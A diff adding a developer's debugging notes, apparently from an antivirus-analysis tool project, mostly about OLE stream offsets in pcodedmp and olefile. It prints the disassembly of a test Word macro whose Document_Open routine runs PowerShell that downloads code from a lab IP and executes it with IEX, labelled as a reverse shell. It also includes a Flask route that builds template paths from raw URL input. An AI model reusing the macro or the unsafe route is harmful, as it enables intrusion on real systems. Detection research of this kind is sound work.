@@ -1,0 +1,646 @@
+dobin@unreal:~/repos/avred$ pcodedmp testing/office/word.docm 
+Processing file: testing/office/word.docm
+===============================================================================
+dir stream: VBA/dir
+-------------------------------------------------------------------------------
+dir stream after decompression:
+691 bytes
+dir stream parsed:
+00000000:  PROJ_SYSKIND:
+00000000   03 00 00 00                                        ....
+
+0000000A:  PROJ_LCID:
+00000000   09 04 00 00                                        ....
+
+00000014:  PROJ_LCIDINVOKE:
+00000000   09 04 00 00                                        ....
+
+0000001E:  PROJ_CODEPAGE:
+00000000   00 00                                              ..
+
+00000026:  PROJ_NAME:
+00000000   50 72 6F 6A 65 63 74                               Project
+
+00000033:  PROJ_DOCSTRING
+00000039:  PROJ_UNICODE_DOCSTRING
+0000003F:  PROJ_HELPFILE
+00000045:  PROJ_UNICODE_HELPFILE
+0000004B:  PROJ_HELPCONTEXT:
+00000000   00 00 00 00                                        ....
+
+00000055:  PROJ_LIBFLAGS:
+00000000   00 00 00 00                                        ....
+
+0000005F:  PROJ_VERSION:
+00000000   E8 4B 80 64 06 00                                  .K.d..
+
+0000006B:  PROJ_CONSTANTS
+00000071:  PROJ_UNICODE_CONSTANTS
+00000077:  PROJ_REFNAME_PROJ:
+00000000   73 74 64 6F 6C 65                                  stdole
+
+00000083:  PROJ_UNICODE_REFNAME_PROJ:
+00000000   73 00 74 00 64 00 6F 00 6C 00 65 00                s.t.d.o.l.e.
+
+00000095:  PROJ_LIBID_REGISTERED:
+00000000   5E 00 00 00 2A 5C 47 7B 30 30 30 32 30 34 33 30    ^...*\G{00020430
+00000010   2D 30 30 30 30 2D 30 30 30 30 2D 43 30 30 30 2D    -0000-0000-C000-
+00000020   30 30 30 30 30 30 30 30 30 30 34 36 7D 23 32 2E    000000000046}#2.
+00000030   30 23 30 23 43 3A 5C 57 69 6E 64 6F 77 73 5C 53    0#0#C:\Windows\S
+00000040   79 73 74 65 6D 33 32 5C 73 74 64 6F 6C 65 32 2E    ystem32\stdole2.
+00000050   74 6C 62 23 4F 4C 45 20 41 75 74 6F 6D 61 74 69    tlb#OLE Automati
+00000060   6F 6E 00 00 00 00 00 00                            on......
+
+00000103:  PROJ_REFNAME_PROJ:
+00000000   4E 6F 72 6D 61 6C                                  Normal
+
+0000010F:  PROJ_UNICODE_REFNAME_PROJ:
+00000000   4E 00 6F 00 72 00 6D 00 61 00 6C 00                N.o.r.m.a.l.
+
+00000121:  PROJ_LIBID_PROJ:
+00000000   09 00 00 00 2A 5C 43 4E 6F 72 6D 61 6C 09 00 00    ....*\CNormal...
+00000010   00 2A 5C 43 4E 6F 72 6D 61 6C E8 4B 80 64 04 00    .*\CNormal.K.d..
+
+00000147:  PROJ_REFNAME_PROJ:
+00000000   4F 66 66 69 63 65                                  Office
+
+00000153:  PROJ_UNICODE_REFNAME_PROJ:
+00000000   4F 00 66 00 66 00 69 00 63 00 65 00                O.f.f.i.c.e.
+
+00000165:  PROJ_LIBID_REGISTERED:
+00000000   94 00 00 00 2A 5C 47 7B 32 44 46 38 44 30 34 43    ....*\G{2DF8D04C
+00000010   2D 35 42 46 41 2D 31 30 31 42 2D 42 44 45 35 2D    -5BFA-101B-BDE5-
+00000020   30 30 41 41 30 30 34 34 44 45 35 32 7D 23 32 2E    00AA0044DE52}#2.
+00000030   30 23 30 23 43 3A 5C 50 72 6F 67 72 61 6D 20 46    0#0#C:\Program F
+00000040   69 6C 65 73 5C 43 6F 6D 6D 6F 6E 20 46 69 6C 65    iles\Common File
+00000050   73 5C 4D 69 63 72 6F 73 6F 66 74 20 53 68 61 72    s\Microsoft Shar
+00000060   65 64 5C 4F 46 46 49 43 45 31 36 5C 4D 53 4F 2E    ed\OFFICE16\MSO.
+00000070   44 4C 4C 23 4D 69 63 72 6F 73 6F 66 74 20 4F 66    DLL#Microsoft Of
+00000080   66 69 63 65 20 31 36 2E 30 20 4F 62 6A 65 63 74    fice 16.0 Object
+00000090   20 4C 69 62 72 61 72 79 00 00 00 00 00 00           Library......
+
+00000209:  PROJ_MODULECOUNT:
+00000000   01 00                                              ..
+
+00000211:  PROJ_COOKIE:
+00000000   01 29                                              .)
+
+00000219:  MOD_NAME:
+00000000   54 68 69 73 44 6F 63 75 6D 65 6E 74                ThisDocument
+
+0000022B:  MOD_UNICODE_NAME:
+00000000   54 00 68 00 69 00 73 00 44 00 6F 00 63 00 75 00    T.h.i.s.D.o.c.u.
+00000010   6D 00 65 00 6E 00 74 00                            m.e.n.t.
+
+00000249:  MOD_STREAM:
+00000000   54 68 69 73 44 6F 63 75 6D 65 6E 74                ThisDocument
+
+0000025B:  MOD_UNICODESTREAM:
+00000000   54 00 68 00 69 00 73 00 44 00 6F 00 63 00 75 00    T.h.i.s.D.o.c.u.
+00000010   6D 00 65 00 6E 00 74 00                            m.e.n.t.
+
+00000279:  MOD_DOCSTRING
+0000027F:  MOD_UNICODE_DOCSTRING
+00000285:  MOD_TEXTOFFSET:
+00000000   93 11 00 00                                        ....
+
+0000028F:  MOD_HELPCONTEXT:
+00000000   00 00 00 00                                        ....
+
+00000299:  MOD_COOKIETYPE:
+00000000   78 EB                                              x.
+
+000002A1:  MOD_FBASMOD_Classes
+000002A7:  MOD_END
+000002AD:  PROJ_EOF
+-------------------------------------------------------------------------------
+_VBA_PROJECT stream:
+3467 bytes
+Identifiers:
+
+0000: Word
+0001: VBA
+0002: Win16
+0003: Win32
+0004: Win64
+0005: Mac
+0006: VBA6
+0007: VBA7
+0008: Project1
+0009: stdole
+000A: Project
+000B: ThisDocument
+000C: _Evaluate
+000D: Normal
+000E: Office
+000F: PS_Execute
+0010: sPSCmd
+0011: Document
+0012: CreateObject
+0013: Run
+0014: Document_Open
+0015: PS
+0016: _B_var_PS
+0017: revShell
+0018: _B_var_revShell
+0019: revShell_1
+001A: revShell_2
+001B: _B_var_revShell_2
+001C: writePoC
+001D: _B_var_writePoC
+001E: Eval
+001F: _B_var_revShell_1
+0020: staged
+0021: _B_var_staged
+0022: powershell
+0023: c
+0024: MsgBox
+0025: Path
+0026: stagedShell
+0027: stagedWrite
+0028: _B_var_stagedWrite
+0029: _B_var_stagedShell
+002A: localWrite
+002B: _B_var_localWrite
+002C: Document_OpenXX
+002D: cmd
+002E: vbOKOnly
+002F: OpenXX
+0030: stagedWriteEnc
+0031: Payload
+0032: _B_var_stagedWriteEnc
+0033: _B_var_cmd
+0034: vbOK
+0035: vbOKCancel
+0036: res
+0037: vbYesNo
+0038: vbYes
+0039: _B_var_res
+003A: stagedSh3ll
+003B: revSh3ll_1
+003C: reshe_1
+003D: reshe_2
+003E: reshe_staged
+003F: write_staged
+0040: write_now
+0041: _B_var_write_now
+0042: _B_var_write_staged
+0043: _B_var_reshe_1
+0044: _B_var_reshe_2
+0045: _B_var_reshe_staged
+
+_VBA_PROJECT parsing done.
+-------------------------------------------------------------------------------
+Module streams:
+VBA/ThisDocument - 5150 bytes
+Line #0:
+        FuncDefn (Public Sub Eval(ByVal sPSCmd As String))
+Line #1:
+        Ld sPSCmd 
+        LitDI2 0x0000 
+        LitVarSpecial (True)
+        LitStr 0x000D "WScript.Shell"
+        ArgsLd CreateObject 0x0001 
+        ArgsMemCall Run 0x0003 
+Line #2:
+        EndSub 
+Line #3:
+Line #4:
+        FuncDefn (Sub Document_Open())
+Line #5:
+        LitStr 0x000E "powershell -c "
+        LitStr 0x006B ""Set-Content -Value 'Local Write PoC' -Path 'C:\Users\hacker\Documents\Macros\Macro_Samples\out\local.txt'""
+        Concat 
+        St write_now 
+Line #6:
+        LitStr 0x000E "powershell -c "
+        LitStr 0x0019 ""$a = curl http://10.10.2"
+        Concat 
+        LitStr 0x0008 "0.106:90"
+        Concat 
+        LitStr 0x000C "03/write; IE"
+        Concat 
+        LitStr 0x0006 "X($a)""
+        Concat 
+        St write_staged 
+Line #7:
+        LitStr 0x0017 "detected, see in _notes"
+        St reshe_1 
+Line #8:
+        LitStr 0x0017 "detected, see in _notes"
+        St reshe_2 
+Line #9:
+        LitStr 0x000E "powershell -c "
+        LitStr 0x0019 ""$a = curl http://10.10.2"
+        Concat 
+        LitStr 0x0008 "0.106:90"
+        Concat 
+        LitStr 0x000C "03/reshe; IE"
+        Concat 
+        LitStr 0x0006 "X($a)""
+        Concat 
+        St reshe_staged 
+Line #10:
+Line #11:
+        Ld reshe_staged 
+        St cmd 
+Line #12:
+        Ld cmd 
+        Ld vbYesNo 
+        LitStr 0x0009 "Continue?"
+        ArgsLd MsgBox 0x0003 
+        St res 
+Line #13:
+        Ld res 
+        Ld vbYes 
+        Eq 
+        IfBlock 
+Line #14:
+        Ld cmd 
+        Paren 
+        ArgsCall Eval 0x0001 
+Line #15:
+        ElseBlock 
+Line #16:
+        LitStr 0x0008 "Aborted."
+        Ld vbOKOnly 
+        LitStr 0x0007 "Aborted"
+        ArgsCall MsgBox 0x0003 
+Line #17:
+        EndIfBlock 
+Line #18:
+        EndSub
+        
+
+
+@app.route('/', defaults={'path': 'index.html'})
+@app.route('/<path>')
+def index(path):
+    content = None
+    return render_template('layouts/default.html',
+                            content=render_template( 'pages/'+path) )
+
+
+
+
+
+
+
+
+* moduleData: 
+* vbaProjectData: vbaProject.bin?
+
+
+vbaProject.bin
+000014b0  54 65 73 74 27 00 36 02  6d 73 67 20 5d 00 f5 04  |Test'.6.msg ]...|
+000014c0  98 00 00 00 20 00 36 02  41 40 34 02 01 00 00 00  |.... .6.A@4.....|
+000014d0  78 00 00 00 ff ff ff ff  90 00 00 00 ff ff ff ff  |x...............|
+000014e0  00 00 01 7f b0 00 41 74  74 72 69 62 75 74 00 65  |......Attribut.e|
+000014f0  20 56 42 5f 4e 61 6d 00  65 20 3d 20 22 4e 65 77  | VB_Nam.e = "New|
+00001500  00 4d 61 63 72 6f 73 22  0d 00 0a 53 75 62 20 41  |.Macros"...Sub A|
+00001510  75 74 00 6f 5f 4f 70 65  6e 28 29 d8 0d 0a 27 00  |ut.o_Open()...'.|
+00001520  08 07 44 20 02 50 03 2a  08 0d 0a 20 00 00 44 69  |..D .P.*... ..Di|
+00001530  6d 20 00 6d 73 67 20 41  73 20 53 39 00 b6 6e 67  |m .msg As S9..ng|
+00001540  03 2c 01 24 00 b4 54 65  0c 73 74 00 aa 01 50 4d  |.,.$..Te.st...PM|
+00001550  73 67 42 04 6f 78 01 2b  0d 0a 0d 0a 45 08 6e 64  |sgB.ox.+....E.nd|
+
+Begin:0x42c End:0x438 LineNr:6 
+        LitStr 0x0004 "Test"
+        St msg 
+
+BBB: Offset: 0x3be  LineOffset: 0x40
+AAAA 1068-1080:         LitStr 0x0004 "Test"
+        St msg 
+
+file - output:
+    14b0-42c = 10B4 = 4171
+
+file size: 13312 = 0x3400
+start my data: 14b0 = 5296
+
+
+-------------
+
+  sect=0 (0), size=1127, offset=0, sectorsize=64, len(fat)=142, fp=<olefile.olefile.OleStream object at 0x7f7d720a4b80>
+Read: VBA/ThisDocument
+Z3: 0
+FUCK: 0
+FUCK SEEK:0
+b'\x01\x16\x03\x00\x06\x00\x01\x00\x004\x03\x00\x00\xe4\x00\x00\x00\xea\x01\x00\x00b\x03\x00\x00p\x03\x00\x00\xc4\x03\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00~\x91=\x87\x00\x00\xff\xff\xa3\x01\x00\x00\x88\x00\x00\x00\xb6\x00\xff\xff\x01\x01\x00'
+
+00000800  01 16 03 00 06 00 01 00  00 34 03 00 00 e4 00 00  |.........4......|
+= 2048
+
+0x800 - 0x0 = 0x800
+
+  sect=26 (1A), size=1253, offset=0, sectorsize=64, len(fat)=142, fp=<olefile.olefile.OleStream object at 0x7f7d720a4b80>
+Read: VBA/NewMacros
+Z3: 1664
+FUCK: 26
+FUCK SEEK:1664
+b'\x01\x16\x03\x00\x03\xf0\x00\x00\x00\xfa\x02\x00\x00\xd4\x00\x00\x00\xb0\x01\x00\x00\xff\xff\xff\xff(\x03\x00\x00\\\x04\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00~\x91\x89\xe6\x00\x00\xff\xff\x03\x00\x00\x00\x00\x00\x00\x00\xb6\x00\xff\xff\x01\x01\x00'
+
+00001080  01 16 03 00 03 f0 00 00  00 fa 02 00 00 d4 00 00  |................|
+= 4224
+
+4224 - 1080 = 3144
+
+
+1664 = 0x680
+     = 26 * 64
+
+Diff in Offset:         1664
+Diff in File:   0x880 = 2176
+                Diff:    512
+
+
+moduleStream:       <olefile.olefile.OleStream object at 0x7f7d720a4f90>
+vbaParser:          <oletools.olevba.VBA_Parser object at 0x7f7d72102d60>
+vbaParser.ole_file: <olefile.olefile.OleFileIO object at 0x7f7d72102af0>
+
+moduleStream:       <olefile.olefile.OleStream object at 0x7f7d720bc040>
+vbaParser:          <oletools.olevba.VBA_Parser object at 0x7f7d72102d60>
+vbaParser.ole_file: <olefile.olefile.OleFileIO object at 0x7f7d72102af0>
+
+-> different modulestream 
+
+OleFileIO::openstream()
+
+entry: Z4: <olefile.olefile.OleDirectoryEntry object at 0x7f7909d39ca0>
+
+reading (seeking) from: fp (in olefile)
+
+
+fp: OleStream
+
+OleDirectoryEntry::sect_chain 
+
+
+----
+
+VBA: Offset 0
+ThisDocument: offset 0
+-> base: 2048
+-> 2048 + 1664 + 512 = 4224
+
+root entry is offset 3
+-> 3+1 * 512 = 2048!
+
+
+        # From [MS-CFB]: A sector number can be converted into a byte offset
+        # into the file by using the following formula:
+        # (sector number + 1) x Sector Size.
+        # This implies that sector #0 of the file begins at byte offset Sector
+        # Size, not at 0.
+
+
+OleFileIO:
+  FUCK is in OleFileIO
+  Which has a filename as param:
+
+    def open(self, filename, write_mode=False):
+        """
+        Open an OLE2 file in read-only or read/write mode.
+        Read and parse the header, FAT and directory.
+
+-------------
+
+'Root Entry' (root) 9088 bytes offset: 3
+  'PROJECT' (stream) 405 bytes offset: 135
+  'PROJECTwm' (stream) 71 bytes offset: 133
+  'VBA' (storage) offset: 0
+    'NewMacros' (stream) 1253 bytes offset: 26    <---
+    'ThisDocument' (stream) 1127 bytes offset: 0  <---
+    '_VBA_PROJECT' (stream) 2564 bytes offset: 52
+    '__SRP_0' (stream) 1746 bytes offset: 102
+    '__SRP_1' (stream) 186 bytes offset: 130
+    '__SRP_2' (stream) 356 bytes offset: 18
+    '__SRP_3' (stream) 106 bytes offset: 24
+    '__SRP_4' (stream) 156 bytes offset: 49
+    '__SRP_5' (stream) 169 bytes offset: 46
+    'dir' (stream) 570 bytes offset: 93
+
+-------------
+
+_VBA_PROJECT stream:
+2564 bytes = A04
+
+
+# - Word 2007+: word/vbaProject.bin in zip archive, then the VBA project is the root of vbaProject.bin.
+
+        Return a list of tuples (vba_root, project_path, dir_path) for each VBA project.
+        vba_root is the path of the root OLE storage containing the VBA project,
+        including a trailing slash unless it is the root of the OLE file.
+        project_path is the path of the OLE stream named "PROJECT" within the VBA project.
+        dir_path is the path of the OLE stream named "VBA/dir" within the VBA project.
+
+
+
+self.vba_projects.append((vba_root, project_path, dir_path))
+return self.vba_projects
+
+
+dirData, codeModules, is64bit = processDir(vbaParser, dirPath, disasmOnly, verbose, output_file=output_file)
+vbaProjectPath = vbaRoot + 'VBA/_VBA_PROJECT'
+vbaProjectData = process_VBA_PROJECT(vbaParser, vbaProjectPath, disasmOnly, verbose, output_file=output_file)
+
+for module in codeModules:
+    modulePath = vbaRoot + 'VBA/' + module
+    result = pcodeDump(moduleData, vbaProjectData, dirData, identifiers, is64bit, disasmOnly, verbose, output_file=output_file)
+
+
+processDir():
+    dirDataCompressed = vbaParser.ole_file.openstream(dirPath).read()
+    dirData = decompress_stream(dirDataCompressed)
+    offset = 0
+    while offset < streamSize:
+        tag = getWord(dirData, offset, '<')
+
+self.ole_file = olefile.OleFileIO(_file, path_encoding=None)
+
+
+vbaProjectData = process_VBA_PROJECT(vbaParser, vbaProjectPath, disasmOnly, verbose, output_file=output_file)
+-> moduleData = vbaParser.ole_file.openstream(modulePath_unicode).read()
+
+
+for subFile in vbaParser.ole_subfiles:
+    result = processProject(subFile, output_file=output_file)
+
+def pcodeDump(moduleData, vbaProjectData, dirData, identifiers, is64bit, disasmOnly, verbose, output_file = sys.stdout):
+
+    dumpLine(it, moduleData, pcodeStart + lineOffset, lineLength, endian, vbaVer, is64bit, identifiers,
+                objectTable, indirectTable, declarationTable, verbose, line, output_file=output_file)
+
+
+def dumpLine(it, moduleData, lineStart, lineLength, endian, vbaVer, is64bit,
+             identifiers, objectTable, indirectTable, declarationTable, verbose, line, output_file=sys.stdout):
+-> lineStart is Offset
+
+
+Offset to what?! -> into moduleData
+
+    offset = lineStart
+    endOfLine = lineStart + lineLength
+    disasmEntry = ''
+    while offset < endOfLine:
+        offset, opcode = getVar(moduleData, offset, endian, False)
+
+
+----------------
+
+Comparison: 
+
+
+0x800:
+
+Script: 
+00000800  01 16 03 00 06 00 01 00  00 34 03 00 00 e4 00 00  |.........4......|
+00000810  00 ea 01 00 00 62 03 00  00 70 03 00 00 c4 03 00  |.....b...p......|
+00000820  00 00 00 00 00 01 00 00  00 7e 91 3d 87 00 00 ff  |.........~.=....|
+00000830  ff a3 01 00 00 88 00 00  00 b6 00 ff ff 01 01 00  |................|
+00000840  00 00 00 ff ff ff ff 00  00 00 00 ff ff 70 00 ff  |.............p..|
+00000850  ff 00 00 a6 81 ce fe c5  df 3d 45 a3 f7 81 17 ff  |.........=E.....|
+00000860  36 9f 10 36 60 29 72 73  1e a3 49 8d 4c 71 39 5f  |6..6`)rs..I.Lq9_|
+
+file: 
+00000800  01 16 03 00 06 00 01 00  00 34 03 00 00 e4 00 00  |.........4......|
+00000810  00 ea 01 00 00 62 03 00  00 70 03 00 00 c4 03 00  |.....b...p......|
+00000820  00 00 00 00 00 01 00 00  00 7e 91 3d 87 00 00 ff  |.........~.=....|
+00000830  ff a3 01 00 00 88 00 00  00 b6 00 ff ff 01 01 00  |................|
+00000840  00 00 00 ff ff ff ff 00  00 00 00 ff ff 70 00 ff  |.............p..|
+00000850  ff 00 00 a6 81 ce fe c5  df 3d 45 a3 f7 81 17 ff  |.........=E.....|
+00000860  36 9f 10 36 60 29 72 73  1e a3 49 8d 4c 71 39 5f  |6..6`)rs..I.Lq9_|
+
+conclusion: at 0x800, both are identical 
+
+0x1080:
+
+Script: 
+00001080  01 16 03 00 03 f0 00 00  00 fa 02 00 00 d4 00 00  |................|
+00001090  00 b0 01 00 00 ff ff ff  ff 28 03 00 00 5c 04 00  |.........(...\..|
+000010a0  00 00 00 00 00 01 00 00  00 7e 91 89 e6 00 00 ff  |.........~......|
+000010b0  ff 03 00 00 00 00 00 00  00 b6 00 ff ff 01 01 00  |................|
+000010c0  00 00 00 ff ff ff ff 00  00 00 00 ff ff 08 00 ff  |................|
+000010d0  ff 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+000010e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+
+File: 
+00001080  01 16 03 00 03 f0 00 00  00 fa 02 00 00 d4 00 00  |................|
+00001090  00 b0 01 00 00 ff ff ff  ff 28 03 00 00 5c 04 00  |.........(...\..|
+000010a0  00 00 00 00 00 01 00 00  00 7e 91 89 e6 00 00 ff  |.........~......|
+000010b0  ff 03 00 00 00 00 00 00  00 b6 00 ff ff 01 01 00  |................|
+000010c0  00 00 00 ff ff ff ff 00  00 00 00 ff ff 08 00 ff  |................|
+000010d0  ff 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+000010e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+
+
+### With filesize = 9088
+
+in olefile:
+f = open('test_debug.bin', 'wb')
+
+-rw-r--r-- 1 dobin dobin  9088 Dec 24 09:24 test_debug.bin
+-rw-r--r-- 1 dobin dobin 13312 Jan  1  1980 vbaProject.bin
+
+13312 - 9088 = 4224 = 1080
+
+0x0: correct
+0x680: correct
+
+-------------
+
+
+Base: 3+1 * 512 = 2048
+Offset 0: 2048 + ( 0*64) = 2048 + 0x0   = 2048 = 0x800
+Offset 1: 2048 + (26*64) = 2048 + 0x680 = 3712 = E80
+26 * 64 = 1664 = 0x680
+
+-------------
+
+-rw-r--r-- 1 dobin dobin  9088 Dec 24 09:43 test_debug1127.bin  # ThisDocument 0
+-rw-r--r-- 1 dobin dobin  9088 Dec 24 09:43 test_debug1253.bin  # NewMacros 26
+-rw-r--r-- 1 dobin dobin  9088 Dec 24 09:43 test_debug2564.bin  # vba_project
+-rw-r--r-- 1 dobin dobin  9088 Dec 24 09:43 test_debug570.bin   # dir
+
+-rw-r--r-- 1 dobin dobin 13312 Dec 24 09:43 test_debug9088.bin  # Root - why all file?
+-rw-r--r-- 1 dobin dobin 13312 Dec 24 09:43 test_debug12800.bin ??
+-rw-r--r-- 1 dobin dobin 13312 Dec 24 09:43 test_debug1024.bin  ??
+
+
+53ee0fc1447927f6dcdb97a7f59ca63f  test_debug1024.bin
+2adea1296a8427abbe8d830fb59d9c11  test_debug1127.bin
+2adea1296a8427abbe8d830fb59d9c11  test_debug1253.bin
+53ee0fc1447927f6dcdb97a7f59ca63f  test_debug12800.bin
+2adea1296a8427abbe8d830fb59d9c11  test_debug2564.bin
+2adea1296a8427abbe8d830fb59d9c11  test_debug570.bin
+53ee0fc1447927f6dcdb97a7f59ca63f  test_debug9088.bin    
+53ee0fc1447927f6dcdb97a7f59ca63f  vbaProject.bin
+
+9088 file: 
+000005d0  00 00 bb 01 44 00 00 00  00 00 00 7f 00 00 00 00  |....D...........| <-1
+000005e0  00 00 00 00 01 00 a0 d9  dd 7a e5 d4 35 b4 74 b4  |.........z..5.t.|
+000005f0  20 df 37 b8 e8 b8 4b 98  5e 2e 1b 31 fb 35 c8 3b  | .7...K.^..1.5.;|
+00000600  72 55 40 00 00 00 00 00  00 00 00 00 00 00 00 00  |rU@.............|
+00000610  00 00 40 00 00 00 00 00  00 00 40 00 00 00 00 00  |..@.......@.....|
+00000620  00 00 00 00 00 00 00 00  00 00 1a 00 00 00 00 00  |................|
+00000630  00 00 11 00 00 00 00 00  00 00 00 00 02 00 ff ff  |................|
+00000640  ff ff ff ff ff ff ff ff  ff ff 00 00 00 00 78 00  |..............x.|
+00000650  00 00 08 00 00 00 00 00  00 00 62 00 00 00 00 00  |..........b.....|
+00000660  00 7f 00 00 00 00 00 00  00 00 3a 20 4d 6f 6e 2c  |..........: Mon,|
+00000670  20 32 39 20 41 75 67 20  32 30 32 32 20 32 31 3a  | 29 Aug 2022 21:|
+00000680  01 16 03 00 03 f0 00 00  00 fa 02 00 00 d4 00 00  |................|
+00000690  00 b0 01 00 00 ff ff ff  ff 28 03 00 00 5c 04 00  |.........(...\..|
+000006a0  00 00 00 00 00 01 00 00  00 7e 91 89 e6 00 00 ff  |.........~......|
+
+real file: 
+00000ff0  00 00 00 00 31 00 00 00  9c 00 00 00 00 00 00 00  |....1...........| <---- difference 
+00001000  72 55 40 00 00 00 00 00  00 00 00 00 00 00 00 00  |rU@.............|
+00001010  00 00 40 00 00 00 00 00  00 00 40 00 00 00 00 00  |..@.......@.....|
+00001020  00 00 00 00 00 00 00 00  00 00 1a 00 00 00 00 00  |................|
+00001030  00 00 11 00 00 00 00 00  00 00 00 00 02 00 ff ff  |................|
+00001040  ff ff ff ff ff ff ff ff  ff ff 00 00 00 00 78 00  |..............x.|
+00001050  00 00 08 00 00 00 00 00  00 00 62 00 00 00 00 00  |..........b.....|
+00001060  00 7f 00 00 00 00 00 00  00 00 3a 20 4d 6f 6e 2c  |..........: Mon,|
+00001070  20 32 39 20 41 75 67 20  32 30 32 32 20 32 31 3a  | 29 Aug 2022 21:|
+00001080  01 16 03 00 03 f0 00 00  00 fa 02 00 00 d4 00 00  |................|
+00001090  00 b0 01 00 00 ff ff ff  ff 28 03 00 00 5c 04 00  |.........(...\..|
+000010a0  00 00 00 00 00 01 00 00  00 7e 91 89 e6 00 00 ff  |.........~......|
+
+
+00000dd0  00 00 bb 01 44 00 00 00  00 00 00 7f 00 00 00 00  |....D...........| <-1
+diff: 2048 = 0x800
+
+
+def processFile(fileName):
+    print('Processing file: {}'.format(fileName), file=output_file)
+        vbaParser = VBA_Parser(fileName)
+
+            for subFile in vbaParser.ole_subfiles: # is oletools.olevba.VBA_Parser
+                result = processProject(subFile, output_file=output_file)
+
+
+
+def processProject(vbaParser, disasmOnly=False, verbose=False, output_file=sys.stdout):
+    results = []
+    vbaProjects = vbaParser.find_vba_projects()
+    for vbaRoot, _, dirPath in vbaProjects:
+        dirData, codeModules, is64bit = processDir(vbaParser, dirPath, disasmOnly, verbose, output_file=output_file)
+        vbaProjectPath = vbaRoot + 'VBA/_VBA_PROJECT'
+        vbaProjectData = vbaParser.ole_file.openstream(vbaProjectPath).read()
+            
+        for module in codeModules:
+            modulePath = vbaRoot + 'VBA/' + module
+                ## Offset is entry.isectStart * 64 (OleStream sector size)
+                # ole_file has direntries based on sid with entry.isectStart
+                # -> which is correct
+                # 
+                # the data is different than on disk.
+                # -> its only the relevant appended, not on disk!
+                moduleStream = vbaParser.ole_file.openstream(modulePath_unicode)
+                moduleData = moduleStream.read()
+
+                result = pcodeDump(moduleData, vbaProjectData, dirData, identifiers, 
+                    is64bit, disasmOnly, verbose, output_file=output_file)
+
